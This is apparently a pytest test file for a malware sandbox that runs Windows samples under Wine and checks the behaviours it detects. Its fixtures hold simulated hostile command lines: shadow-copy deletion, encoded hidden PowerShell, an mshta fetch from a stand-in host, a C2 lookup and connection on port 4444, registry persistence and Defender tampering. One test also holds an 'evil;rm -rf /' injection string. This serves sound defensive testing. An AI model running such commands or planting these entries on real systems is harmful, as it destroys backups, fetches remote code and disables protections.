import os
import shutil
import subprocess
from pathlib import Path

import pytest

from monthunter.sandbox import (
    SandboxConfig,
    _GUEST_SCRIPT,
    _user_data_prepare,
    _user_data_run,
    analyze_windows,
    detect_sample_os,
    parse_serial_log,
    run_sandbox,
)
from monthunter.scoring import compute_risk

from .helpers import build_minimal_pe

WINDEBUG = r'''0024:trace:process:CreateProcessInternalW app (null) cmdline L"C:\\windows\\system32\\winemenubuilder.exe -a -r"
003c:trace:process:CreateProcessInternalW app L"C:\\windows\\system32\\services.exe" cmdline (null)
003c:trace:process:CreateProcessInternalW app (null) cmdline L"C:\\windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted"
0024:trace:process:CreateProcessInternalW app L"C:\\windows\\system32\\cmd.exe" cmdline L"cmd /c vssadmin delete shadows /all /quiet"
0024:trace:process:CreateProcessInternalW app (null) cmdline L"powershell.exe -nop -w hidden -enc SQBFAFgA"
0024:trace:process:CreateProcessInternalW app (null) cmdline L"schtasks /create /tn x /tr C:\\a.exe"
0024:trace:process:CreateProcessInternalW app (null) cmdline L"mshta http://x.invalid/a.hta"
0024:trace:winsock:getaddrinfo node "mh-sandbox", service (null), hints 0000
0024:trace:winsock:gethostbyname "C2.Evil.Invalid"
0024:trace:winsock:connect socket 0x34, addr { family AF_INET, address 203.0.113.7, port 4444 }, len 16
0024:trace:winsock:connect socket 0x38, addr { family AF_INET, address 10.0.0.5, port 445 }, len 16
0024:trace:winsock:connect socket 0x3c, addr { family AF_INET, address 8.8.8.8, port 53 }, len 16
'''

WINREG = "\n".join(
    [
        'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\t"Upd"="C:\\\\Users\\\\Public\\\\u.exe"',
        'System\\\\CurrentControlSet\\\\Services\\\\EvilSvc\t"ImagePath"="C:\\\\evil.exe"',
        'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\taskmgr.exe\t"Debugger"="C:\\\\x.exe"',
        'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\t"Shell"="evil.exe"',
        'Software\\\\Policies\\\\Microsoft\\\\Windows Defender\t"DisableAntiSpyware"=dword:00000001',
        'Volatile Environment\t"USERDOMAIN"="X"',
        'Software\\\\Wine\\\\Explorer\t"x"="y"',
    ]
)
WINFILES = "\n".join(
    [
        "/root/.wine/drive_c/users/Public/dropper.exe",
        "/root/.wine/drive_c/users/root/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/a.lnk",
        "/root/.wine/drive_c/users/root/notes.txt",
        "/root/.wine/drive_c/windows/temp/x.log",
    ]
)


def _behaviors(res):
    return {f["behavior"] for f in res["findings"]}


def test_analyze_windows_behaviours():
    res = analyze_windows({"windebug": WINDEBUG, "winreg": WINREG, "winfiles": WINFILES})
    assert _behaviors(res) >= {
        "shadow_copy_deletion",
        "encoded_powershell",
        "scheduled_task_creation",
        "lolbin_execution",
        "dns_lookup_attempt",
        "network_connection_attempt",
        "persistence_registry_run",
        "service_registered",
        "ifeo_hijack",
        "winlogon_hijack",
        "defender_tampering",
        "startup_folder_drop",
        "dropped_executable",
    }
    assert res["dns_queries"] == ["c2.evil.invalid"]  # guest hostname is not an IOC
    assert {"ip": "203.0.113.7", "port": 4444} in res["network_attempts"]
    details = " ".join(f["detail"] for f in res["findings"])
    assert "winemenubuilder" not in details and "services.exe" not in details and "svchost" not in details
    assert "10.0.0.5" not in " ".join(f["detail"] for f in res["findings"] if f["behavior"] == "network_connection_attempt")
    assert "C:\\users\\Public\\dropper.exe" in res["new_files"]
    assert "notes.txt" not in " ".join(f["detail"] for f in res["findings"])  # plain text file is not a dropper
    assert not any("windows\\temp" in p for p in res["new_files"])


def test_analyze_windows_ignores_wine_registry_noise():
    res = analyze_windows({"winreg": 'Volatile Environment\t"A"="b"\nSoftware\\\\Wine\\\\X\t"a"="b"'})
    assert res["findings"] == []


def serial_windows():
    def sec(n, b):
        return f"===MH_BEGIN {n}===\r\n{b}\r\n===MH_END {n}===\r\n"

    return (
        sec("meta", "rc=0 elapsed=3 mode=wine")
        + sec("strace", "strace not used in wine mode")
        + sec("stdout", "hi")
        + sec("ps_before", "")
        + sec("ps_after", "  9 1 root wine-preloader")
        + sec("newfiles", "")
        + sec("windebug", WINDEBUG)
        + sec("winreg", WINREG)
        + sec("winfiles", WINFILES)
        + "===MH_DONE===\r\n"
    )


def test_parse_serial_log_windows_mode():
    res = parse_serial_log(serial_windows())
    assert res["ran"] and res["completed"] and res["strace_available"] is False
    assert res["new_processes"] == []
    assert "persistence_registry_run" in _behaviors(res)


def test_risk_ignores_plain_process_creation():
    assert compute_risk({"dynamic": {"ran": True, "findings": [{"behavior": "process_creation"}]}})["score"] == 0


# --- OS detection ---------------------------------------------------------------
def test_detect_sample_os(tmp_path):
    exe, dll, elf, txt = (tmp_path / n for n in ("a.bin", "b.bin", "c.bin", "d.bin"))
    exe.write_bytes(build_minimal_pe())
    pe = bytearray(build_minimal_pe())
    pe[0x40 + 4 + 18] |= 0x00
    pe[0x40 + 4 + 18 : 0x40 + 4 + 20] = (0x2102).to_bytes(2, "little")  # IMAGE_FILE_DLL
    dll.write_bytes(bytes(pe))
    elf.write_bytes(b"\x7fELF" + b"\x00" * 100)
    txt.write_text("#!/bin/sh\necho hi\n")
    assert detect_sample_os(exe) == ("windows", "exe")
    assert detect_sample_os(dll) == ("windows", "dll")
    assert detect_sample_os(elf) == ("linux", "exe")
    assert detect_sample_os(txt) == ("linux", "exe")
    assert detect_sample_os(tmp_path / "missing") == ("linux", "exe")
    assert detect_sample_os(_fake_mz(tmp_path)) == ("linux", "exe")  # MZ without a PE header is not Windows


def _fake_mz(tmp_path):
    p = tmp_path / "mz.bin"
    p.write_bytes(b"MZ" + b"\x00" * 200)
    return p


# --- guest script / prepare invariants ------------------------------------------
def test_wine_mode_never_uses_strace_on_wine():
    # "strace -f wine" takes the whole guest down; the wine branch must not do it.
    wine_branch = _GUEST_SCRIPT.split('if [ "$MODE" = "wine" ]; then', 1)[1].split("\nelse\n", 1)[0]
    code = "\n".join(ln for ln in wine_branch.splitlines() if not ln.lstrip().startswith("#"))
    assert "strace -f" not in code
    assert "WINEDEBUG" in wine_branch and "wine rundll32" in wine_branch


def test_user_data_modes_render():
    ud = _user_data_run(30, "wine", "dll")
    assert "MODE=wine" in ud and "KIND=dll" in ud and "mh-regdiff.py" in ud
    assert "MODE=linux" in _user_data_run(30, "bogus", "bogus")
    assert "KIND=exe" in _user_data_run(30, "wine", "evil;rm -rf /")  # never templated from untrusted input


def test_prepare_profiles():
    assert "wine" not in _user_data_prepare(False)
    assert "wine wine-mono" in _user_data_prepare(True) and "MH_WINE_OK" in _user_data_prepare(True)


def test_run_sandbox_picks_wine_for_pe(tmp_path, monkeypatch):
    from monthunter import sandbox

    if not shutil.which("xorriso"):
        pytest.skip("xorriso not installed")
    monkeypatch.setattr(SandboxConfig, "validate", lambda self: None)
    seen = {}
    real_user_data = sandbox._user_data_run

    def spy_user_data(timeout, mode="linux", kind="exe"):
        seen["mode"], seen["kind"] = mode, kind
        return real_user_data(timeout, mode, kind)

    def fake_run(cmd, serial_log, wall_timeout, tmpdir):
        Path(serial_log).write_text(serial_windows())
        return False

    monkeypatch.setattr(sandbox, "_user_data_run", spy_user_data)
    monkeypatch.setattr(sandbox, "_run_qemu", fake_run)
    sample = tmp_path / "s.exe"
    sample.write_bytes(build_minimal_pe())
    res = run_sandbox(sample, SandboxConfig(image=str(tmp_path / "g")), tmp_path / "w")
    assert res["guest_os"] == "windows" and res["engine"] == "wine"
    assert (seen["mode"], seen["kind"]) == ("wine", "exe")


# --- real VM (opt-in) -----------------------------------------------------------
@pytest.mark.skipif(
    not (os.environ.get("MH_SANDBOX_IMAGE") and shutil.which("x86_64-w64-mingw32-gcc")),
    reason="needs MH_SANDBOX_IMAGE (prepared with --with-wine) and mingw-w64",
)
def test_real_vm_windows_probe(tmp_path):
    src = Path(__file__).parent / "fixtures" / "winprobe.c"
    exe = tmp_path / "winprobe.exe"
    subprocess.run(["x86_64-w64-mingw32-gcc", "-O1", "-o", str(exe), str(src), "-lws2_32", "-ladvapi32"], check=True)
    res = run_sandbox(exe, SandboxConfig(image=os.environ["MH_SANDBOX_IMAGE"], timeout=60), tmp_path / "w")
    assert res["ran"] and res["completed"], res.get("serial_tail")
    assert res["engine"] == "wine"
    assert {"ip": "203.0.113.7", "port": 4444} in res["network_attempts"]
    assert "c2.evil.invalid" in res["dns_queries"]
    assert {"persistence_registry_run", "dropped_executable"} <= _behaviors(res)
